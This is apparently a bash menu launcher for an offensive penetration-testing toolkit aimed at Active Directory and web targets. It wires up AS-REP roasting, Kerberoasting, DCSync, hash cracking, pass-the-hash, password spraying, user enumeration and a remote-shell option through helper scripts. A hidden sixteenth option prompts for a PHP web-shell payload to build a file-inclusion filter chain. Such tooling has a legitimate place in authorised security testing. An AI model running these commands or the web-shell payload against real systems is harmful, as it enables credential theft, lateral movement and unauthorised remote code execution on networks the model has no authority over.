#!/bin/bash

echo "Loading files..."

echo -n "Loading: "
    for i in {1..10}; do
        echo -n "█████"
        sleep 0.1  # Delay to simulate loading
    done
    echo ""  # Move to the next line
    echo -e "\e[1;32mFiles loaded successfully!\e[0m"
    sleep 0.5


sudo chmod +x *
sudo chmod +x kittle/*
#read -sp "Enter password: " pass
#echo ""  # Move to the next line

#if [[ $pass == "1234" ]]; then
    # Loading animation
 #   echo -n "Verifying:	"
  #  for i in {1..10}; do
   #     echo -n "█████"
    #    sleep 0.1  # Delay to simulate loading
    #done
    echo ""  # Move to the next line
    echo -e "\e[1;32mAccess Granted!\e[0m"
    sleep 0.5

    # Display ASCII art
    echo -e "\e[1;31m"
    echo " ██▀███      ▒█████     ▒██▒   ██▒    ▒█████         "
    sleep 0.1
    echo "▓██ ▒ ██▒   ▒██▒  ██▒   ▒██▒██▒██▒   ▒██▒  ██▒       "
    sleep 0.1
    echo "▓██ ░▄█ ▒   ▒██░  ██▒   ▒██░ ████░   ▒██░  ██▒       "
    sleep 0.1
    echo "▒██▀▀█▄     ▒██   ██░   ▒██   ██▓▒   ▒███████▒       "
    sleep 0.1
    echo "░██▓ ▒██▒   ░ ████▓▒░   ▒██   ██▒░   ▒██░  ██▒       "
    sleep 0.1
    echo "░ ▒▓ ░▒▓░   ░ ▒░▒░▒░    ▒██   ▒░     ▒ █   ██▒       "
    sleep 0.1
    echo "  ░▒ ░ ▒░     ░ ▒ ▒░   ░ ▒    ▒░     ░ ▒  ░▒▓░       "
    sleep 0.1
    echo "  ░░   ░    ░ ░ ░ ▒     ░     ▒       ░     ░ ░      "
    sleep 0.1
    echo -e "   ░            ░  @cyberkid_6226 ░ ░       ░ ░            \n"
    sleep 0.2
spd-say "hey"
echo -e "\e[1;32m"
echo -e "[+] Choose by number the action to perform\n"
echo -e "[1] AD-NPusers\t\t[2]AD-bloodhound\t[3]AD-dcsync\n[4] Hashcat-NTusers\t[5]Hashcat-kebroute\t[6]AD-kerberoust\n[7]AD-launchblood-hound\t[8]AD-pass The hash\t[9]AD-passwd spray\n[10]Pass-The-hash2\t[11]WAF fast test\t[12] Netscanner\n[13] Kerbote user enum\t[14]Scan and data collection\n[15]AD Nmap_user_enum"

echo -e "\e[1;30m"
read -p "What do you want to do: " number
spd-say "$number"
echo -e "\e[1;33m"
case $number in

        1)
            echo "GetNPUsers.py <domain>/ -usersfile <userfile> -format hashcat -output hashes.txt"
            bash kittle/ad-asrep.sh
        ;;

            2)
        echo "Running AD-Bloodhound..."
        bash kittle/ad-bloodhound.sh
        ;;
    3)
        echo "Running AD-DCsync..."
        bash kittle/ad-dcsync.sh
        ;;
    4)
        echo "Running Hashcat for NTusers..."
        bash kittle/ad-hashcat-asrep.sh
        ;;
    5)
        echo "Running Hashcat for Kerberoast..."
        bash kittle/ad-hashcat-kerberoast.sh
        ;;
    6)
        echo "Running AD-Kerberos..."
        bash kittle/ad-kerberoast.sh
        ;;
    7)
        echo "Launching Bloodhound..."
        bash kittle/ad-launch-bloodhound.sh
        ;;
    8)
        echo "Running Pass the Hash..."
        bash kittle/ad-passthehash.sh
        ;;
    9)
        echo "Running Password Spray..."
        bash kittle/ad-passwordspray.sh
        ;;

    10)
        echo "Window gaining shell access"
        bash kittle/ad-evil-win.sh

        ;;

    11)
        echo -e "
[+] WAF Testing Menu
---------------------
# Run a basic test against a URL:
    waf-smoke-test.sh \"https://your-website.com\"

# Test with custom HTTP headers:
    waftest \"https://your-website.com\" -H \"User-Agent: Custom Browser\"
        "
        read -p "Enter the link to test start [http/https]: " link
        read -p "Add User-Agent if necessary (e.g., -H \"User-Agent: Custom Browser\") or press Enter to skip: " brow
        bash kittle/wafkid.sh "$link" $brow
    ;;

	12)
	bash networkscan.sh

	;;

	13)
	echo -e "[+] Enumarating users\n"
	read -p "Enter the domain: " domain
	read -p "Enter the ip address: " addr
	read -p "Enter the path to the userlist: " user

	./kerbrute userenum --dc $addr -d $domain $user

	;;

	14)
	read -p "Enter target address: " address
	python3 mynmap.py -r $address
    echo -e "[+] Scanning using mynmap compleated\n\tDoes this not enough if note we can use more enumarating tools like dig, nslookup..(etc)"
	
    read -p "[+] Do you whant to continue?(y/n): " choose
    #if [ choose == "y" ] then
    echo -e "[+] Performing nslookkup! on $address"
        nslookup $address
    echo -e "[+] Performing dig enum on $address"
        dig $address
    echo -e "[+] Performing enum4linux on $address"
        enum4linux $address

    #else

        echo -e "[+] Ooops! bye dude."

    #fi


	;;


    15)
    read -p "Enter the address: " ip
    read -p "Enter domain: " domain

    nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm="$domain",userdb=users.txt $ip
    echo -e "\n📅 Test Date: $(date)"


    ;;

    16)
    echo "[+] Hey LFI right you need to create orgenerate the payload using php filters worry out"
    read -p "Enter the php payload ecample <?php system($_GET["cmd"]); ?>: " pay
    python3 phpcrash.py --chain $pay
    

    ;;

        *)
        echo -e "Damn! invalid option"
        ;;

        esac
